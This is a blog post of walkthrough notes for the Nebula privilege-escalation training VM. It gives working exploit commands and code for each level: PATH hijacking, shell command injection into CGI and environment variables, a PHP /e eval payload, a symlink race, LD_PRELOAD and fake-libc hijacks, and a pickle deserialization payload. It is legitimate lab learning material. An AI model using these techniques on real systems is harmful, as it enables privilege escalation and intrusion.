---
layout: post
title: Nebula Notes
---

This is my notes for the Nebula VM.

https://exploit-exercises.com/nebula/

## Level 0

Find suids: `find / -perm -4000 2>/dev/null` 

## Level 1

We need to exploit a SUID to execute arbitrary code. We are given the source, the exploitable line is.

`system("/usr/bin/env echo and now what?")`

`env` in this context is used to reference a user's path.

If we `echo $PATH` we get
```
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
```
Which means the program searches through these directories in order to find our executable, in this instance, `echo`.

We add another directory to path
```bsh
level01@nebula:/home/flag01$ PATH=/tmp:$PATH
```
And place an executable in there called `echo` like
```bsh
#!/bin/sh

/bin/sh
```
Then running the `flag01` SUID executable gives us a shell as user flag01.

## Level 2

Ok I love this VM.

Vulnerable code is 

```c
 buffer = NULL;

  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
  printf("about to call system(\"%s\")\n", buffer);
  
  system(buffer);
```
So we set our $USER
```bsh
level02@nebula:/home/flag02$ export USER='; /bin/sh #'
```
Run the executable and get a shell as flag02

## Level 3

This level runs the below script with a cronjob.

```bsh
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
Looking at the script it seems to run any executable in the writable.d directory.
Let's write a script to get the flag
```
#/bin/sh

/bin/getflag >> /tmp/flag03/flag
```
Make sure to set permissions/executable then wait for the cron to run.

## Level 4

Create a symlink

```
level04@nebula:/home/flag04$ ln -s /home/flag04/token /tmp/level04
```
Pass the sl as arg to the executable. Use the output to `su flag04` then `getflag`

## Level 5

```
level05@nebula:/home/flag05$ mkdir /tmp/flag05
level05@nebula:/home/flag05$ cd /tmp/flag05
/tmp/flag05$ tar -xvzf /home/flag05/.backup/backup-19072011.tgz -C .
level05@nebula:/tmp/flag05$ cd .ssh/
level05@nebula:/tmp/flag05/.ssh$ ls
authorized_keys  id_rsa  id_rsa.pub
level05@nebula:/tmp/flag05/.ssh$ ssh flag05@nebula -i id_rsa
flag05@nebula:~$ getflag
```

## Level 6

```
cat /etc/passwd/
```
Crack the hash with john

## Level 7

So this line

```
ping(param("Host"));
```
means we invoke the program like
```
level07@nebula:/home/flag07$ ./index.cgi Host=127.0.0.1
```
We can passthrough our own commands using a semicolon, but the program isn't SUID so it doesn't really help.

The other file in `/home/flag07/` is the config for a web server that looks like it runs on port 7007. Let's break out nc and see if we can reach it.

```
level07@nebula:/home/flag07$ netcat 127.0.0.1 7007
GET /index.cgi?Host=127.0.0.1%3Bwhoami
Content-type: text/html

<html><head><title>Ping results</title></head><body><pre>PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.
64 bytes from 127.0.0.1: icmp_req=1 ttl=64 time=0.015 ms
64 bytes from 127.0.0.1: icmp_req=2 ttl=64 time=0.046 ms
64 bytes from 127.0.0.1: icmp_req=3 ttl=64 time=0.045 ms

--- 127.0.0.1 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 1999ms
rtt min/avg/max/mdev = 0.015/0.035/0.046/0.015 ms
flag07
```
Note te %3B HTML encoding for the semi colon. The webserver runs as flag07, so we can execute our getflag through injecting the right param. 
```
GET /index.cgi?Host=127.0.0.1%3Bgetflag
Content-type: text/html

...

You have successfully executed getflag on a target account
```

## Level 08

We have a packet capture file we can read with tcpdump

Using the below flags makes it sort of readable.
```
tcpdump -qns 0 -X -r capture.pcap
```
We can see an attempted login to `wwwbugs.log` with a password field. But most of this is gibberish to me. Googling around I found out about `tcpflow` so I gave it a try.

```
tcpflow -C -r capture.pcap
```
The interesting output was
```
Password:
059.233.235.218.39247-059.233.235.223.12121: b
059.233.235.218.39247-059.233.235.223.12121: a
059.233.235.218.39247-059.233.235.223.12121: c
059.233.235.218.39247-059.233.235.223.12121: k
059.233.235.218.39247-059.233.235.223.12121: d
059.233.235.218.39247-059.233.235.223.12121: o
059.233.235.218.39247-059.233.235.223.12121: o
059.233.235.218.39247-059.233.235.223.12121: r
059.233.235.218.39247-059.233.235.223.12121: .
059.233.235.218.39247-059.233.235.223.12121: .
059.233.235.218.39247-059.233.235.223.12121: .
059.233.235.218.39247-059.233.235.223.12121: 0
059.233.235.218.39247-059.233.235.223.12121: 0
059.233.235.218.39247-059.233.235.223.12121: R
059.233.235.218.39247-059.233.235.223.12121: m
059.233.235.218.39247-059.233.235.223.12121: 8
059.233.235.218.39247-059.233.235.223.12121: .
059.233.235.218.39247-059.233.235.223.12121: a
059.233.235.218.39247-059.233.235.223.12121: t
059.233.235.218.39247-059.233.235.223.12121: e
059.233.235.218.39247-059.233.235.223.12121:
059.233.235.223.12121-059.233.235.218.39247: .
```
After trying a few things and more google I work out that `hex 71 == . == del` which gives the password `backd00Rmate`

We could have tried using wireshark to the read the pcap too.

## Level 09

I am not a php guy. This took a while.

```php
$contents = preg_replace("/(\[email (.*)\])/e", "spam(\"\\2\")", $contents);
```

That /e means the returned text is evaluated/executed.

Googling around I found PHP complex curly syntax. 

http://php.net/manual/en/language.types.string.php#language.types.string.parsing.complex

So we make a file an put this in it

```
[email {$use_me}]
```
And then run it like
```
./flag09 /tmp/flag09 hi
hi
```
PHP has a through ways to make system calls, let's go with system. We edit our file
```
[email {${system($use_me)}}]
```
And now we have code execution as flag09. We could also have dropped getflag or a /bin/sh in our file directly instead of using the parameter for RCE.

## Level 10

This level requires exploiting a TOCTOU bug.

https://en.wikipedia.org/wiki/Time_of_check_to_time_of_use

We exploit the race condition between the between the access check and file read as access() checks UID permissions but the O_RDONLY uses EUID which differ as the program has the SUID set.

First We start a nc listenenr on the box and background it.

```
 c -kl  18211 >> /tmp/out.txt  &
```
This will listen on port 18211 and write any data it receives to /tmp/out.txt The k flag keeps nc listening after a connection.

Next we send a file we have access to, make a /tmp/flag10 and put whatever in it. Run as
```
./flag10 /tmp/flag10 localhost
```
Now we have to find a way to swap the file after the access call but before the ready call. The easiest way to do this is using symlinks and altering their destination during the running of the program.

Make a bash loop to make the token and contiunally overwrite it, then background the loop
```bsh
while true; do ln -fs /tmp/flag10 /tmp/token; ln -fs /home/flag10/token /tmp/token; done &
```
Write another loop to continually run the program trying to send the symlinked file
```
while true; do ./flag10 /tmp/token 10.0.0.101; done
```
Look at the output file, we should get some entries like.
```
.oO Oo.
615a2ce1-b2b5-4c76-8eed-8aa5c4015c27
```
su flag10 using the output as the password, getflag.

## Level 11

Let's take this slow.

```c
length = atoi(line + strlen(CL));
```
This is just some pointer arithmetic, basically it takes any input longer than the "Content-Length: " header and converts it into an int.
```c
char buf[1024];
 if(length < sizeof(buf))
    ...
 else 
    ...
```
```bash
level11@nebula:/home/flag11$ echo -n "Content-Length: 1024" | ./flag11
blue = 1024, length = 1024, pink = 0
flag11: fread fail(blue = 1024, length = 1024): No such file or directory
level11@nebula:/home/flag11$ echo -n "Content-Length: 1023" | ./flag11
```
So if our input is is below 1024 we enter this condition, otherwise we go to the else. There are exploits in both, let's start with input < 1024.

```c
  if(length < sizeof(buf)) {
      if(fread(buf, length, 1, stdin) != length) {
          err(1, "fread length");
      }
      process(buf, length);
```
We read a second line of stdin into buf.

Fread returns the number of data elements it was able to read of size length. Our `fread` is passed 1 in the param for number to read. So if we put any number other than 1 in Content-Header: our fread return doesn't match length and error out. We can put nothing or non-integers but then we don't control the buffer.

Basically it means we can set `Content-Length: 1` and then feed one byte into buf that will be passed to `process()`
```c
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```
This like it performs some encryption upon our buffer and then executes it as a system command.

Let's run the program a few times to see what happens to our passed buffer.

```bsh
level11@nebula:/home/flag11$ echo -ne "Content-Length: 1\nh" | ./flag11
sh: $'i\300P': command not found
level11@nebula:/home/flag11$ echo -ne "Content-Length: 1\nh" | ./flag11
sh: i: command not found
level11@nebula:/home/flag11$ echo -ne "Content-Length: 1\nh" | ./flag11
sh: i/: No such file or directory
```
A couple things to note.
1. The -n flag on echo makes it not autoa-append new lines.
2. The -e flag makes it interpret escape characters. This means we can enter two stdin strings in one echo.
3. Since we only have one byte to play with our buffer is not null terminated. It looks like sometimes it is processed with junk, and someonetimes the next byte is null anyway.

Our h buffer seems to get incremented to i and then system is called on it. If we make a bash script called i and then run the program a few times until we get the null terminated buffer we should get control.

```
level11@nebula:/tmp/flag11$ echo -ne "Content-Length: 1\nh" | /home/flag11/flag11
sh: $'i\3606': command not found
level11@nebula:/tmp/flag11$ echo -ne "Content-Length: 1\nh" | /home/flag11/flag11
sh: $'i\220\206': command not found
level11@nebula:/tmp/flag11$ ./i
sh-4.2$ whoami
level11
```
HMMM. This should work. The source code provided does not match the compiled executable. I'm happy leaving this here.

Let's try exploit the other path.

```c
} else {
      int blue = length;
      int pink;

      fd = getrand(&path);

      while(blue > 0) {
          printf("blue = %d, length = %d, ", blue, length);

          pink = fread(buf, 1, sizeof(buf), stdin);
          printf("pink = %d\n", pink);

          if(pink <= 0) {
              err(1, "fread fail(blue = %d, length = %d)", blue, length);
          }
          write(fd, buf, pink);

      mem = mmap(NULL, length, PROT_READ|PROT_WRITE, MAP_PRIVATE, fd, 0);
      if(mem == MAP_FAILED) {
          err(1, "mmap");
      }
      process(mem, length);
  }
          blue -= pink;
      }    

```

So with length > 1024
1. Set blue = length
2. Initialise integer pink
3. Get a random file
4. Print blue & length to stdout
5. Read 1024 bytes into pink from stdin
6. If less than 1024 bytes read error out
7. Else write to the random file
8. Read the written data back in
9. Call process against it, which will decrypt and execute it

Since we are dealing with such a large buffer let's write a python script to generate our exploit.

We create 11.py in /tmp

```python
print "Content-Length: 1024\n" + "a" * 1024
```

And run like

```bsh
level11@nebula:/tmp$ python 11.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
flag11: mmap: Bad file descriptor
```
Bad file descriptor. Our file descriptor is returned from the getrand function.
```c
int getrand(char **path)
{
  char *tmp;
  int pid;
  int fd;

  srandom(time(NULL));

  tmp = getenv("TEMP");
  pid = getpid();
  
  asprintf(path, "%s/%d.%c%c%c%c%c%c", tmp, pid,
      'A' + (random() % 26), '0' + (random() % 10),
      'a' + (random() % 26), 'A' + (random() % 26),
      '0' + (random() % 10), 'a' + (random() % 26));

  fd = open(*path, O_CREAT|O_RDWR, 0600);
  unlink(*path);
  return fd;
}
```
getenv("TEMP") stands out. Let's set $TEMP to a writeable directory and try again.
```bsh
level11@nebula:/tmp$ export TEMP=/tmp
level11@nebula:/tmp$ python 11.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
sh: $'a\376\300\200': command not found
```
There we go, we made it to the system call. Now we just need to get it to execute the command we want.

Last time with the one byte exploit we we just able to guess what the process function was doing. This time it looks like we need to reverse it to get it to output the command we want.

 ```c
void process(char *buffer, int length)
{
  unsigned int key;
  int i;

  key = length & 0xff;

  for(i = 0; i < length; i++) {
      buffer[i] ^= key;
      key -= buffer[i];
  }

  system(buffer);
}
```
Let's write a python script to reverse the encryption
```python
command = "/bin/getflag\x00"
length = 1024

key = 0;

encoded = ""

for char in command:
        enc = ord(char) ^ key & 0xff
        encoded += chr(enc)
        key = key - ord(char) & 0xff


print "Content-Length: 1024\n" + encoded  + "a" * (length - len(encoded))
```
And then run it
```bsh
level11@nebula:/tmp$ python 11.py | /home/flag11/flag11
blue = 1024, length = 1024, pink = 1024
getflag is executing on a non-flag account, this doesn't count
```
Again as our source code doesn't match the compiled exe it doesn't complete as flag11, but considering I could copy that code in, compile it as root with SUID set, I'm considering this done.

## Level 12

Simple command injection

```bsh
level12@nebula:/home/flag12$ ls
flag12.lua
level12@nebula:/home/flag12$ nc localhost 50001
Password: ; getflag > /tmp/12
Better luck next time
level12@nebula:/home/flag12$ cat /tmp/12
You have successfully executed getflag on a target account
```

## Level 13

We hijack the getuid library call with a LD_Preload. We have to copy the flag13 program for this to work. Look up getuid spoofing if you need a further explanation of LD Preloading.

```bash
level13@nebula:/tmp$ cat libfake.c
int getuid() {
        return 1000;
}
level13@nebula:/tmp$ cp /home/flag13/flag13 .
level13@nebula:/tmp$ gcc -shared libfake.c -o libfake.so
level13@nebula:/tmp$ LD_PRELOAD=./libfake.so ./flag13
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
```

## Level 14

Don't roll your own crypto kids. It looks like flag14 just increments the characters in string by their place in the string indexed from zero. Let's write a python script to reverse it.

```python
encoded = "857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."

decoded = ""
count = 0

for c in encoded:
        decoded += chr(ord(c) - count)
        count = count + 1

print decoded
```

## Level 15

So flag15 is an RPATH compiled executable. This means it has hard coded paths it checks for libraries, and in these paths it doesn't drop SUID rights. Strace shows it is looking at `/var/tmp/flag15` which we have write access to.

So we make a fake lib c, choose a function `flag15` calls and overwrite it with a shell call.
```bsh
level15@nebula:/var/tmp/flag15$ vi libc.c
```
```c
#include <stdio.h>

int __libc_start_main(int (*main) (int, char * *, char * *), int argc, char * * ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end)) {
        system("/bin/sh");
        return 0;
}
```
We need to make a version file for compilation reasons.
```bash
level15@nebula:/var/tmp/flag15$ vi version.ld
```
```c
GLIBC_2.0 {
};
```
Compile and run.
```bash
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic dummy_libc.c -o libc.so.6
gcc: error: dummy_libc.c: No such file or directory
level15@nebula:/var/tmp/flag15$ gcc -shared -static-libgcc -fPIC -Wl,--version-script=version.ld,-Bstatic libc.c -o libc.so.6
level15@nebula:/var/tmp/flag15$ /home/flag/flag15
-sh: /home/flag/flag15: No such file or directory
level15@nebula:/var/tmp/flag15$ /home/flag15/flag15
sh-4.2$ getflag
You have successfully executed getflag on a target account
```

## Level 16

```perl
@output = `egrep "^$username" /home/flag16/userdb.txt 2>&1`;
```

This line looks vulnerable.

```perl
$username =~ tr/a-z/A-Z/; # conver to uppercase
  $username =~ s/\s.*//;        # strip everything after a space
```

We get one word to play with, and the full path must be all uppercase. The program also doesn't return the output to us. Let's write a script name EXPLOIT, invoke it with a wildcard to bypass the upercase restriction and then write output to a file

```bash
#/bin/bash
/bin/getflag > tmp/16.out
```
Then url encode
```
`/*/XPLOIT`
```
To `%60%2F%2A%2FXPLOIT%60` and use it as the username.
```bash
level16@nebula:/tmp$ wget -O - http://localhost:1616/index.cgi?username="%60%2F%2A%2FXPLOIT%60"&password="meh"
...
level16@nebula:/tmp$ cat 16.out
You have successfully executed getflag on a target account
```

## Level 17

Data serialization and unserialization is always worth looking at.

I had to google around for a suitable attack string.

```bash
level17@nebula:~$ cat /tmp/17
cos
system
(S'getflag > /tmp/17.out'
tR.
level17@nebula:~$ nc localhost 10007 < /tmp/17
Accepted connection from 127.0.0.1:56133^C
level17@nebula:~$ cat /tmp/17.out
You have successfully executed getflag on a target account
```

## Level 18

```c
#define PWFILE "/home/flag18/password"

void login(char *pw)
{
  FILE *fp;

  fp = fopen(PWFILE, "r");
  if(fp) {
      char file[64];

      if(fgets(file, sizeof(file) - 1, fp) == NULL) {
          dprintf("Unable to read password file %s\n", PWFILE);
          return;
      }
                fclose(fp);
      if(strcmp(pw, file) != 0) return;       
  }
  dprintf("logged in successfully (with%s password file)\n",
      fp == NULL ? "out" : "");
  
  globals.loggedin = 1;

}
```
This looks vulnerable to me, it fails open, and there's even a debug statement mentioning it. If fp = null which means it can't read PWFILE, it logs us in.

We can't delete `/home/flag18/password` we can't change the `ulimit` on max fp, so it looks like we just have to open the max amount.

```bash
level18@nebula:/home/flag18$ ulimit -a
core file size          (blocks, -c) 0
data seg size           (kbytes, -d) unlimited
scheduling priority             (-e) 0
file size               (blocks, -f) 4
pending signals                 (-i) 7885
max locked memory       (kbytes, -l) 64
max memory size         (kbytes, -m) unlimited
open files                      (-n) 1024
```

Let's write a python script to generate our attack string and put it in a file called attack.

```
level18@nebula:~$ cat 18gen.py
print "login me\n" * 1021 + "closelog\n" + "shell\n"
level18@nebula:~$ python 18gen.py >> attack
```

We have to call the shell with specific flags, I googled for them.

```
level18@nebula:~$ cat attack | ../flag18/flag18 --init-file /ha -d /dev/tty
../flag18/flag18: invalid option -- '-'
../flag18/flag18: invalid option -- 'i'
../flag18/flag18: invalid option -- 'n'
../flag18/flag18: invalid option -- 'i'
../flag18/flag18: invalid option -- 't'
../flag18/flag18: invalid option -- '-'
../flag18/flag18: invalid option -- 'f'
../flag18/flag18: invalid option -- 'i'
../flag18/flag18: invalid option -- 'l'
../flag18/flag18: invalid option -- 'e'
Starting up. Verbose level = 0
logged in successfully (without password file)
getflag
You have successfully executed getflag on a target account
^C
```

## Level 19

This looks like the vulnerable code.

```c
/* check the owner id */

  if(statbuf.st_uid == 0) {
      /* If root started us, it is ok to start the shell */

      execve("/bin/sh", argv, envp);
      err(1, "Unable to execve");
  }
```

The key to understanding this exploit is
1. Unix processes can start subprocesses
2. If the parent of a subprocess (children) dies before the child finishes executing, the child is inherited by init.
3. In this instance init runs as root.

```c
#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>

int main(int argc, char **argv, char **envp) {

        int child;
        child = fork();
        if(child >= 0) {

                if(child == 0) {

                        sleep(1);
                        setresuid(geteuid(), geteuid(), geteuid());
                        char *args[] = {"/bin/sh", "-c", "/bin/getflag", NULL};
                        execve("/home/flag19/flag19", args, envp);

                }

        }

        exit(0);

}
```
Basically we start our program, create a child and tell it to sleep. Our parent completes and exits, then the child is inherited, sets it's EUID as it's new owner (init -> root) and then completes.

```
level19@nebula:/tmp$ ./proc-starter
level19@nebula:/tmp$ You have successfully executed getflag on a target account
```

Whoohoo Nebula done. I learnt a ton, great box.